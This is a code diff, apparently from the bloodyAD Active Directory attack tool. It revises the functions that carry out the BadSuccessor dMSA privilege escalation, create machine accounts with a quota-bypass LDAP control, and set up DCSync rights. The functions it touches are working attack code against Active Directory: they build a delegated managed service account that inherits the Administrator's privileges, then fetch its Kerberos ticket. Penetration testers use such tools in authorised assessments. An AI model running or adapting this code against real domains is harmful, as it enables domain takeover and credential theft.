@@ -102,7 +102,7 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     attr = {
         "objectClass": ["msDS-DelegatedManagedServiceAccount"],
         "sAMAccountName": dmsa+'$',
-        "dNSHostName": f"{dmsa}.{conn.conf.domain}",
+        "dNSHostName": f"{dmsa}.{conn.ldap.dc_domain}",
         "msDS-ManagedPasswordInterval": 30,
         "msDS-GroupMSAMembership": SECURITY_DESCRIPTOR.from_sddl(f"O:S-1-5-32-544D:(A;;0xf01ff;;;{self_sid})"),
         "msDS-DelegatedMSAState": 2,
@@ -119,20 +119,20 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     splitted_url = conn.ldap.co_url.split("-",1)
     if "sspi" in splitted_url[0]:
         LOG.error("[-] SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or minikerberos certstore, e.g.:")
-        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py 'kerberos+certstore://{conn.conf.domain}\{conn.conf.username}@192.168.100.5' 'krbtgt/{conn.conf.domain}@{conn.conf.domain}' '{dmsa_sama}@{conn.conf.domain}' --dmsa")
+        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}@192.168.100.5' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
         return
     url = "kerberos+" + splitted_url[1]
     LOG.debug(f"[*] Using minikerberos url: {url}")
     try:
         cu = factory.KerberosClientFactory.from_url(url)
         client = cu.get_client_blocking()
-        service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.conf.domain}@{conn.conf.domain}")
-        target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.conf.domain}")
+        service_spn = KerberosSPN.from_spn(f"krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}")
+        target_user = KerberosSPN.from_upn(f"{dmsa_sama}@{conn.ldap.dc_domain}")
         tgs, encTGSRepPart, key = client.S4U2self(target_user, service_spn, is_dmsa=True)
     except Exception as e:
         LOG.error(f"[-] Failed to retrieve dMSA TGT")
         LOG.error("[-] Try using Rubeus, or something like:")
-        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py '{url}' 'krbtgt/{conn.conf.domain}@{conn.conf.domain}' '{dmsa_sama}@{conn.conf.domain}' --dmsa")
+        LOG.error(f"python minikerberos-bAD/examples/getS4U2self.py '{url}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
         raise e
 
     kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
@@ -165,8 +165,11 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime:
 
     if ou == "DefaultOU":
         container = None
+        # When the requester has specified the LDAP_SERVER_BYPASS_QUOTA_OID control "1.2.840.113556.1.4.2256"
+        # And has been granted the control access right DS-Bypass-Quota on the object
+        # that is the root of the NC in which the operation is to be performed
         for obj in next(
-            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
+            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"], controls=[("1.2.840.113556.1.4.2256", False, None)])
         )["wellKnownObjects"]:
             if "GUID_COMPUTERS_CONTAINER_W" == obj.binary_value:
                 container = obj.dn
@@ -184,9 +187,9 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime:
     # Default computer SPNs
     spns = [
         "HOST/%s" % hostname,
-        "HOST/%s.%s" % (hostname, conn.conf.domain),
+        "HOST/%s.%s" % (hostname, conn.ldap.dc_domain),
         "RestrictedKrbHost/%s" % hostname,
-        "RestrictedKrbHost/%s.%s" % (hostname, conn.conf.domain),
+        "RestrictedKrbHost/%s.%s" % (hostname, conn.ldap.dc_domain),
     ]
     attr = {
         "objectClass": [
@@ -196,7 +199,7 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime:
             "user",
             "computer",
         ],
-        "dnsHostName": "%s.%s" % (hostname, conn.conf.domain),
+        "dnsHostName": "%s.%s" % (hostname, conn.ldap.dc_domain),
         "userAccountControl": 0x1000,
         "servicePrincipalName": spns,
         "sAMAccountName": f"{hostname}$",
@@ -206,9 +209,9 @@ def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime:
     if lifetime > 0:
         attr["objectClass"].append("dynamicObject")
         attr["entryTTL"] = lifetime
-
+    
     conn.ldap.bloodyadd(computer_dn, attributes=attr)
-    LOG.info(f"[+] {hostname} created")
+    LOG.info(f"[+] {hostname}$ created")
 
 
 def dcsync(conn, trustee: str):
@@ -333,7 +336,7 @@ def dnsRecord(
         return
 
     new_dnsrecord_list.append(new_dnsrecord.getData())
-    print(new_dnsrecord_list)
+
     conn.ldap.bloodymodify(
         record_dn, {"dnsRecord": [(Change.REPLACE.value, new_dnsrecord_list)]}
     )
